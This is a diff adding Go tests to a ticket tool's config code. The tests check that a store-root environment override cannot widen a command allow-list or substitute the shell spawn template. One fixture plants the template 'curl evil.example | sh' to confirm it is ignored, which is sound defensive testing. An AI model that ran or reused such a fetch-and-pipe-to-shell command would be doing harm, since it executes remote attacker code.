@@ -595,6 +595,95 @@ func TestVerifyAllowReadsLocalOnly(t *testing.T) {
 	}
 }
 
+// TestVerifyAllowIgnoresStoreRootOverride pins the allow-list to the machine
+// owner's own config. TK_STORE_ROOT moves every store and config path except
+// this one: the override root belongs to whoever set the variable, so following
+// it would let a sandbox widen the list, and a sandbox with no config would
+// restore the defaults over a list the owner had narrowed.
+func TestVerifyAllowIgnoresStoreRootOverride(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	homePath, err := homeConfigPath()
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.MkdirAll(filepath.Dir(homePath), 0o755)
+	writeFileAtomic(homePath, Config{VerifyAllow: []string{"go"}})
+
+	override := t.TempDir()
+	t.Setenv(StoreRootEnv, override)
+
+	// No config in the sandbox: the narrowed list still governs rather than
+	// falling through to the built-in defaults.
+	got, err := VerifyAllow()
+	if err != nil {
+		t.Fatalf("VerifyAllow: %v", err)
+	}
+	if !slices.Equal(got, []string{"go"}) {
+		t.Errorf("VerifyAllow() = %q under an empty override root, want the machine-local [go]", got)
+	}
+
+	// A list planted in the sandbox must not widen it.
+	overridePath, err := ConfigPath()
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.MkdirAll(filepath.Dir(overridePath), 0o755)
+	writeFileAtomic(overridePath, Config{VerifyAllow: []string{"sh"}})
+
+	got, err = VerifyAllow()
+	if err != nil {
+		t.Fatalf("VerifyAllow: %v", err)
+	}
+	if !slices.Equal(got, []string{"go"}) {
+		t.Errorf("VerifyAllow() = %q, want the machine-local [go]: the override root cannot widen it", got)
+	}
+}
+
+// TestSpawnCommandIgnoresStoreRootOverride pins the spawn template to the
+// machine owner's own config for the same reason the allow-list is pinned: the
+// template is handed to `sh -c`, so a root whoever set TK_STORE_ROOT owns must
+// not be able to supply the code the TUI runs.
+func TestSpawnCommandIgnoresStoreRootOverride(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	homePath, err := homeConfigPath()
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.MkdirAll(filepath.Dir(homePath), 0o755)
+	writeFileAtomic(homePath, Config{SpawnCommand: "tmux new-window {id}"})
+
+	override := t.TempDir()
+	t.Setenv(StoreRootEnv, override)
+
+	got, err := SpawnCommand()
+	if err != nil {
+		t.Fatalf("SpawnCommand: %v", err)
+	}
+	if got != "tmux new-window {id}" {
+		t.Errorf("SpawnCommand() = %q under an empty override root, want the machine-local template", got)
+	}
+
+	// A template planted in the sandbox must not replace it.
+	overridePath, err := ConfigPath()
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.MkdirAll(filepath.Dir(overridePath), 0o755)
+	writeFileAtomic(overridePath, Config{SpawnCommand: "curl evil.example | sh"})
+
+	got, err = SpawnCommand()
+	if err != nil {
+		t.Fatalf("SpawnCommand: %v", err)
+	}
+	if got != "tmux new-window {id}" {
+		t.Errorf("SpawnCommand() = %q, want the machine-local template: the override root cannot supply one", got)
+	}
+}
+
 func TestVerifyAllowSurvivesSave(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
@@ -715,5 +804,157 @@ func TestResolveWorkDir(t *testing.T) {
 	// Unknown project under central store → parent fallback.
 	if got := ResolveWorkDir("/central/tickets/unknown", cfg); got != "/central/tickets" {
 		t.Errorf("unknown project: got %q, want /central/tickets", got)
+	}
+}
+
+func TestStoreRootOverrideWinsOverConfig(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	configured := t.TempDir()
+	cfg := Config{CentralRoot: configured, Projects: map[string]ProjectConfig{}}
+	if err := Save(cfg); err != nil {
+		t.Fatalf("Save: %v", err)
+	}
+
+	override := t.TempDir()
+	t.Setenv(StoreRootEnv, override)
+
+	root, err := CentralStoreRoot()
+	if err != nil {
+		t.Fatalf("CentralStoreRoot: %v", err)
+	}
+	if root != override {
+		t.Errorf("CentralStoreRoot = %q, want the override %q", root, override)
+	}
+
+	// The local config moves under the override root, so an isolated run never
+	// reads or writes the machine's ~/.ticket/config.yaml.
+	path, err := ConfigPath()
+	if err != nil {
+		t.Fatalf("ConfigPath: %v", err)
+	}
+	if want := filepath.Join(override, ".ticket", "config.yaml"); path != want {
+		t.Errorf("ConfigPath = %q, want %q", path, want)
+	}
+
+	shared, err := SharedConfigPath()
+	if err != nil {
+		t.Fatalf("SharedConfigPath: %v", err)
+	}
+	if want := filepath.Join(override, configFileName); shared != want {
+		t.Errorf("SharedConfigPath = %q, want %q", shared, want)
+	}
+
+	loaded, err := Load()
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if loaded.CentralRoot != "" {
+		t.Errorf("Load read the configured local config: central_root = %q", loaded.CentralRoot)
+	}
+}
+
+// TestStoreRootOverrideSaveSplitsLocalAndShared holds Save's two halves to one
+// resolution of the central root. Under the override with no central_root in
+// the config — the shape an isolated run has — a local-only split predicate
+// would write the shared-owned fields into both files, and a project later
+// dropped from the shared config would go on merging as `store: central` from
+// the stale local copy that CentralRegistered gates writes on.
+func TestStoreRootOverrideSaveSplitsLocalAndShared(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+
+	override := t.TempDir()
+	t.Setenv(StoreRootEnv, override)
+
+	cfg := Config{
+		Projects: map[string]ProjectConfig{
+			"sandbox": {Path: "/repo/sandbox", Store: "central", RegisteredAt: "2026-01-01T00:00:00Z"},
+		},
+	}
+	if err := Save(cfg); err != nil {
+		t.Fatalf("Save: %v", err)
+	}
+
+	local, err := loadFile(filepath.Join(override, configDirName, configFileName))
+	if err != nil {
+		t.Fatalf("loadFile local: %v", err)
+	}
+	if p := local.Projects["sandbox"]; p.Store != "" || p.RegisteredAt != "" {
+		t.Errorf("local project = %+v, want the shared-owned fields left to the shared config", p)
+	}
+	if p := local.Projects["sandbox"]; p.Path != "/repo/sandbox" {
+		t.Errorf("local project path = %q, want /repo/sandbox", p.Path)
+	}
+
+	shared, err := loadFile(filepath.Join(override, configFileName))
+	if err != nil {
+		t.Fatalf("loadFile shared: %v", err)
+	}
+	if p := shared.Projects["sandbox"]; p.Store != "central" {
+		t.Errorf("shared project = %+v, want store: central", p)
+	}
+}
+
+func TestStoreRootOverrideConfiguresWithoutLocalConfig(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	t.Setenv(StoreRootEnv, t.TempDir())
+
+	if !IsConfigured() {
+		t.Error("IsConfigured should be true under the override with no local config")
+	}
+}
+
+// TestStoreRootOverrideNonAbsoluteIsRefused covers both non-absolute values a
+// harness produces: a relative path, and the empty string that `export
+// TK_STORE_ROOT="$SANDBOX"` leaves behind when $SANDBOX expanded to nothing.
+// The empty one is a set-but-unusable store root, not an absent variable —
+// reading it as absent would resolve the configured central store, which is
+// exactly the silent fall-back the override exists to prevent.
+func TestStoreRootOverrideNonAbsoluteIsRefused(t *testing.T) {
+	for _, tc := range []struct{ name, value string }{
+		{"relative", "relative/store"},
+		{"empty", ""},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			home := t.TempDir()
+			t.Setenv("HOME", home)
+
+			configured := t.TempDir()
+			cfg := Config{CentralRoot: configured, Projects: map[string]ProjectConfig{}}
+			if err := Save(cfg); err != nil {
+				t.Fatalf("Save: %v", err)
+			}
+
+			t.Setenv(StoreRootEnv, tc.value)
+
+			root, err := CentralStoreRoot()
+			if err == nil {
+				t.Fatalf("CentralStoreRoot = %q, want an error for a non-absolute override", root)
+			}
+			if root != "" {
+				t.Errorf("CentralStoreRoot = %q, want no fall-back to the configured store", root)
+			}
+			if !strings.Contains(err.Error(), StoreRootEnv) {
+				t.Errorf("error %q should name %s", err, StoreRootEnv)
+			}
+
+			if _, err := ConfigPath(); err == nil {
+				t.Error("ConfigPath should error rather than fall back to ~/.ticket/config.yaml")
+			}
+			if _, err := Load(); err == nil {
+				t.Error("Load should error rather than resolve the configured store")
+			}
+			if err := Save(cfg); err == nil {
+				t.Error("Save should error rather than write the configured store")
+			}
+
+			// The bool gate must not swallow the bad value into a run that then
+			// resolves the real store: it reports configured, and CentralStoreRoot
+			// above is what fails.
+			if !IsConfigured() {
+				t.Error("IsConfigured should report the override as set so the error surfaces")
+			}
+		})
 	}
 }
